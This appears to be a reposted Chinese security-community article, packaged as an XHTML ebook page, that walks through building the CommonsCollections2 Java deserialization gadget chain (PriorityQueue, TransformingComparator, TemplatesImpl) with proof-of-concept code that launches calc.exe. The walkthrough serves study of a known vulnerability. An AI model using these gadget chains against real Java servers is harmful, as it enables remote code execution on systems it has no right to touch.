@@ -1,0 +1,96 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>Java反序列化漏洞-玄铁重剑之CommonsCollection(下)</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>Java反序列化漏洞-玄铁重剑之CommonsCollection(下)</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw==&amp;mid=2247484637&amp;idx=1&amp;sn=eb55c38b6217fd678fb1866437e33f58&amp;chksm=ec6fe3dddb186acb6682cf4cee09b249e8e8dbc3a129270af51a60acfa7219e38174613d0f28&amp;scene=126&amp;sessionid=1681378715#rd">http://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw==&amp;mid=2247484637&amp;idx=1&amp;sn=eb55c38b6217fd678fb1866437e33f58&amp;chksm=ec6fe3dddb186acb6682cf4cee09b249e8e8dbc3a129270af51a60acfa7219e38174613d0f28&amp;scene=126&amp;sessionid=1681378715#rd</a></blockquote><section class="xmteditor" style="display:none;" data-tools="&#x65B0;&#x5A92;&#x4F53;&#x7BA1;&#x5BB6;" data-label="powered by xmt.cn"/><h3 style="white-space: normal;max-width: 100%;color: rgb(62, 62, 62);"><strong style="max-width: 100%;color: rgb(255, 41, 65);box-sizing: border-box !important;word-wrap: break-word !important;">先知安全技术社区独家发文，如需转载，请先联系社区授权；未经授权请勿转载。</strong></h3><h2 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.4em;border-bottom: 1px solid rgb(238, 238, 238);">前言:</h2><p style="margin-bottom: 1.2em !important;">玄铁重剑，是金庸小说笔下第一神剑。由「玄铁」制成，重八八六十四斤；由「剑魔」独孤求败所使，四十岁前持之无敌于天下。
+ 
+独孤求败逝去后为杨过所得，并由独孤求败的「朋友」神雕引导，之后在神雕的指导下，也根据独孤求败的独门秘籍及练功方法，练成了一身天下无敌的剑法及内功心法。</p><h2 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.4em;border-bottom: 1px solid rgb(238, 238, 238);">主角:</h2><p style="margin-bottom: 1.2em !important;">CommonsCollection, commons-collections.jar</p><h2 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.4em;border-bottom: 1px solid rgb(238, 238, 238);">介绍:</h2><p style="margin-bottom: 1.2em !important;">Java Collections Framework 是JDK 1.2中的一个重要组成部分。它增加了许多强大的数据结构，加速了最重要的Java应用程序的开发。从那时起，它已经成为Java中集合处理的公认标准。官网介绍如下:<br/><img class="" data-ratio="0.43514150943396224" data-src="https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIon8icW2N3GcKBT25MozJogLtADZ2OoJuRvzA0PdY7lLObfOibevsgn8OPfwd6oZ7Ov62pWhHCbWE7g/640?wx_fmt=png" data-type="png" data-w="1696" src="../Images/ed70be5cc6d2e160755fcd14f8dbbe97.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIon8icW2N3GcKBT25MozJogLtADZ2OoJuRvzA0PdY7lLObfOibevsgn8OPfwd6oZ7Ov62pWhHCbWE7g/640?wx_fmt=png"/><br/>Commons Collections使用场景很广，很多商业,开源项目都使用到了commons-collections.jar。<br/>很多组件，容器，cms(诸如WebLogic、WebSphere、JBoss、Jenkins、OpenNMS等)的rce漏洞都和Commons Collections反序列被披露事件有关。</p><h2 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.4em;border-bottom: 1px solid rgb(238, 238, 238);">正文:</h2><p style="margin-bottom: 1.2em !important;">再讲一个执行链，在ysoserial中，CommonsCollections2提到了，通过上一篇的分析，我们得知执行链很多。接下来接着分析另外一个执行链, 需要借助的是PriorityQueue这个类，这里我找到了一条执行链</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">PriorityQueue.readObject()-&gt;PriorityQueue.heapify()-&gt;PriorityQueue.siftDown()-&gt;PriorityQueue.siftDownUsingComparator()-&gt;TransformingComparator.compare()-&gt;InvokerTransformer.transformat()</code></pre><p style="margin-bottom: 1.2em !important;">这和ysoserial提到的是一样的, 下面我们自己来尝试构造下poc。<br/>通过分析源码，我们可构造出TransformingComparator.compare的大致结构如下:</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">public static void main(final String[] args) throws Exception {
+       runcompare();
+    }
+    public static void runcompare(){
+           InvokerTransformer invokerTransformer= getInvokerTransformer();
+           TransformingComparator transformingComparator = new TransformingComparator(invokerTransformer);
+           Runtime runtime1 = Runtime.getRuntime();
+           transformingComparator.compare(runtime1, null);
+
+       }
+       public static InvokerTransformer getInvokerTransformer(){
+           String[] cmds = new String[]{"calc.exe"};
+           InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String[].class}, new Object[]{cmds});
+           return invokerTransformer;
+       }</code></pre><p style="margin-bottom: 1.2em !important;"><img class="" data-ratio="0.5377102550189907" data-src="https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIon8icW2N3GcKBT25MozJogLLhaJVKhaVjgNo6q898KjxlYt1I2CxyZ3M6sCKnRia9ThZLpKic6NarLw/640?wx_fmt=png" data-type="png" data-w="1843" src="../Images/9d9183645bc24f9b99090f8aa999bef6.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIon8icW2N3GcKBT25MozJogLLhaJVKhaVjgNo6q898KjxlYt1I2CxyZ3M6sCKnRia9ThZLpKic6NarLw/640?wx_fmt=png"/><br/>其中PriorityQueue.siftDownUsingComparator调用compare的地方如下，查看源码可知，我们要将runtime对象放在 queue中。<br/><img class="" data-ratio="0.5076271186440678" data-src="https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIon8icW2N3GcKBT25MozJogLP1OibWYiaNibOF1XYfibyE28sJhSUFcyeBldAB8RN7jpHVr2S4RADKE7icw/640?wx_fmt=png" data-type="png" data-w="1180" src="../Images/8e5bb83e34d8997fd424edbb1527fc12.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIon8icW2N3GcKBT25MozJogLP1OibWYiaNibOF1XYfibyE28sJhSUFcyeBldAB8RN7jpHVr2S4RADKE7icw/640?wx_fmt=png"/><br/>通过分析源码得知， 必须要给comparator赋值，comparator的赋值操作可以在构造函数里面进行。<br/><img class="" data-ratio="0.2759680393362016" data-src="https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIon8icW2N3GcKBT25MozJogLL78ctbjBnxVEqaheOT6qrCI3LAJJkSybNarv6o7kKck0Z1PccYZSPg/640?wx_fmt=png" data-type="png" data-w="1627" src="../Images/009fb3c1893bafeac474c7052946f120.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIon8icW2N3GcKBT25MozJogLL78ctbjBnxVEqaheOT6qrCI3LAJJkSybNarv6o7kKck0Z1PccYZSPg/640?wx_fmt=png"/><br/>通过最终分析组合出如下poc:</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">public Queue&lt;Object&gt; getObject(final String command) throws Exception {
+        PriorityQueue queue = getPriorityQueue();
+        return queue;
+    }
+
+    public static void main(final String[] args) throws Exception {
+        PayloadRunner.run(CommonsCollections2.class, args);
+    }
+    public static PriorityQueue getPriorityQueue() throws Exception {
+        TransformingComparator transformingComparator = getTransformingComparator();
+        PriorityQueue priorityQueue = new PriorityQueue(1, transformingComparator);
+        priorityQueue.add(Runtime.getRuntime());
+        return priorityQueue;
+    }
+
+    public static TransformingComparator getTransformingComparator(){
+        InvokerTransformer invokerTransformer= getInvokerTransformer();
+        TransformingComparator transformingComparator = new TransformingComparator(invokerTransformer);
+        return transformingComparator;
+
+    }
+    public static InvokerTransformer getInvokerTransformer(){
+        String[] cmds = new String[]{"calc.exe"};
+        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String[].class}, new Object[]{cmds});
+        return invokerTransformer;
+    }
+    }</code></pre><p style="margin-bottom: 1.2em !important;">但是在序列化的时候就出错了，2333，<br/>很显然，Runtime不能直接序列化，因为他没有实现接口。<br/><img class="" data-ratio="0.26671619613670133" data-src="https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIon8icW2N3GcKBT25MozJogL3YRXnBgNnvNAvCnlSia6P8OmpI4uEMENZ6kyicemhxgSzkMHWnK6MfsA/640?wx_fmt=png" data-type="png" data-w="1346" src="../Images/d8c6c57372873239499215f387b1d487.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIon8icW2N3GcKBT25MozJogL3YRXnBgNnvNAvCnlSia6P8OmpI4uEMENZ6kyicemhxgSzkMHWnK6MfsA/640?wx_fmt=png"/><br/>那么想通过类似于CommonsCollection1的方式去执行函数，即</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">inal Transformer[] transformers = new Transformer[]{
+    new ConstantTransformer(Runtime.class),
+    new InvokerTransformer("getMethod", new Class[]{
+    String.class, Class[].class}, new Object[]{
+    "getRuntime", new Class[0]}),
+    new InvokerTransformer("invoke", new Class[]{
+    Object.class, Object[].class}, new Object[]{
+    null, new Object[0]}),
+    new InvokerTransformer("exec",
+    new Class[]{String.class}, execArgs),
+    new ConstantTransformer(1)};
+    final Transformer transformerChain = new ChainedTransformer(
+    new Transformer[]{new ConstantTransformer(1)});
+    Transformer transformerChain = new ChainedTransformer(transformers);</code></pre><p style="margin-bottom: 1.2em !important;">然而并不行，这个类在commons-collections4.jar中不具有类。最终还是看了一下ysoserial的poc，发现其利用的到是TemplatesImpl类,后面很多反序列化都用到这个。<br/><img class="" data-ratio="0.3174934725848564" data-src="https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIon8icW2N3GcKBT25MozJogL6pxd1ey27KJAPT1eA3V2nsg6hwCUt2vt9ZtnDBFatrI8um38nsYyZw/640?wx_fmt=png" data-type="png" data-w="1915" src="../Images/62ffdce9e77b56208db5b0c1ac48dba0.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIon8icW2N3GcKBT25MozJogL6pxd1ey27KJAPT1eA3V2nsg6hwCUt2vt9ZtnDBFatrI8um38nsYyZw/640?wx_fmt=png"/><br/>笔者记得在廖新喜师傅在分析fastsjon反序列化的时候也提到过这个，http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/<br/>我们需要将一个编译成class 文件的类进行base64编码，并且赋值给_bytecodes，关于怎么做可以参考廖师傅的文章。我这里讲一下pwntester是怎么做的，这种做法需要借助ClassPool。</p><h3 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.3em;">浅谈ClassPool怎么用:</h3><p style="margin-bottom: 1.2em !important;">classPool简单用法如下:</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">public class Main {
+    public static void main(String[] args){
+        try
+        {
+            ClassPool pool = ClassPool.getDefault();
+            CtClass ctClass = pool.makeClass("net.codersec.Person");
+            CtField ctField = new CtField(CtClass.intType, "name", ctClass);
+            ctField.setModifiers(Modifier.PUBLIC);
+            ctClass.addField(ctField);
+            byte[] bytes = ctClass.toBytecode();
+            FileOutputStream fileOutputStream = new FileOutputStream(new File("Person.class"));
+            fileOutputStream.write(bytes);
+            fileOutputStream.close();
+        }catch (Exception e){
+          e.printStackTrace();
+        }
+    }
+    }</code></pre><p style="margin-bottom: 1.2em !important;">运行上面的代码就会生成一个class文件，反编译结果如下:<br/><img class="" data-ratio="0.5617198335644937" data-src="https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIon8icW2N3GcKBT25MozJogLhofDp0l7WU4B44n3RagUamWoXI4SZXb9xN2eQib1yNcFIDqYGYuHXTA/640?wx_fmt=png" data-type="png" data-w="721" src="../Images/3e221749a8bdfc745360b83ae607a478.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIon8icW2N3GcKBT25MozJogLhofDp0l7WU4B44n3RagUamWoXI4SZXb9xN2eQib1yNcFIDqYGYuHXTA/640?wx_fmt=png"/><br/>这里有一个小技巧，就是在Class.newInstance的时候，可以在Class的构造函数里面加要执行的恶意代码，但是也可以 通过insertAfter()将要执行的代码在构造函数运行后运行。<br/><img class="" data-ratio="0.33789473684210525" data-src="https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIon8icW2N3GcKBT25MozJogL1m6aYiaaF4UTnyJMPRN9Jszo0MtyaC0ASockMOE3xJBvXtypibD41BAQ/640?wx_fmt=png" data-type="png" data-w="1900" src="../Images/49a4510fb7987982dec51beb15038db0.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIon8icW2N3GcKBT25MozJogL1m6aYiaaF4UTnyJMPRN9Jszo0MtyaC0ASockMOE3xJBvXtypibD41BAQ/640?wx_fmt=png"/><br/>其生成的代码如下:<br/><img class="" data-ratio="0.37013401403956603" data-src="https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIon8icW2N3GcKBT25MozJogL09FcJs9klJIicBOibwlibh9JgGXZ4zlyMDiabZruzibehYB3VcZn7bqEInQ/640?wx_fmt=png" data-type="png" data-w="1567" src="../Images/2a1df2b7bddbcde1dd677195fc8887ee.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIon8icW2N3GcKBT25MozJogL09FcJs9klJIicBOibwlibh9JgGXZ4zlyMDiabZruzibehYB3VcZn7bqEInQ/640?wx_fmt=png"/><br/>最终调试完成之后poc如下:</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">final Object templates = Gadgets.createTemplatesImpl(command);
+    final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
+    final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2,new TransformingComparator(transformer));
+    queue.add(templates);
+    queue.add(templates);
+    Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
+    final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
+    return queue;</code></pre><p style="margin-bottom: 1.2em !important;">其中用到的是函数 
+TemplatesImpl.newTransformer，而不是TemplatesImpl.getTransletInstance，因为getTransletInstance权限是private不能被直接反射?试了几个public权限的函数，比如getOutputProperties，newTransformer都可以。
+ 且getOutputProperties，newTransformer中都有调用getTransletInstance。</p><h2 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.4em;border-bottom: 1px solid rgb(238, 238, 238);">拓展学习</h2><p style="margin-bottom: 1.2em !important;">其实除了InvokerTransformer.transformat，还可以利用InstantiateTransformer.transformat()，其中collcetion5就是利用了com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter构造函数中调用了TemplatesImpl.getTransletInstance()<br/><img class="" data-ratio="0.2922374429223744" data-src="https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIon8icW2N3GcKBT25MozJogLoQGHlk7N04lj7UE6ycUYLbEdmoDfdun2hchHUtsPkem8AyBEvLb9gg/640?wx_fmt=png" data-type="png" data-w="1533" src="../Images/7d386b38d6b9b729b3291d59d3265220.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIon8icW2N3GcKBT25MozJogLoQGHlk7N04lj7UE6ycUYLbEdmoDfdun2hchHUtsPkem8AyBEvLb9gg/640?wx_fmt=png"/><br/><img class="" data-ratio="0.27505966587112174" data-src="https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIon8icW2N3GcKBT25MozJogLTTezzziaiampNRHK6JGorba2VkWTrNpDZBoHMh5OrzPGapQwCt24Q3vg/640?wx_fmt=png" data-type="png" data-w="1676" src="../Images/1d59eea6077ab9c7f4fbd2e30dc4141a.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIon8icW2N3GcKBT25MozJogLTTezzziaiampNRHK6JGorba2VkWTrNpDZBoHMh5OrzPGapQwCt24Q3vg/640?wx_fmt=png"/><br/>其调用链更复杂</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">PriorityQueue.readObject()-&gt;PriorityQueue.heapify()-&gt;PriorityQueue.siftDown()-&gt;PriorityQueue.siftDownUsingComparator()-&gt;TransformingComparator.compare()-&gt;InstantiateTransformer.transformat()-&gt;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.newInstance()-&gt;TemplatesImpl.getTransletInstance()-&gt;Class.newInstance()</code></pre><p><br/></p><section class="xmt-style-block" data-tools="&#x65B0;&#x5A92;&#x4F53;&#x6392;&#x7248;" style="white-space: normal;color: rgb(51, 51, 51);"><section class="" style="margin-top: 5px;font-size: 16px;line-height: normal;border-width: 0px;border-style: none;border-color: initial;background-image: none;"><section class="white" style="margin-top: -1px;min-height: 40px;visibility: visible;height: 40px;line-height: 40px;border-radius: 10px;box-shadow: rgb(190, 190, 190) 0px 3px 5px;background-color: rgb(51, 179, 235);color: rgb(255, 255, 255);"><span style="font-size: 14px;text-align: center;">↙↙↙   点击“阅读原文”查看相关话题探讨</span></section></section></section>
+        
+</body>
+</html>
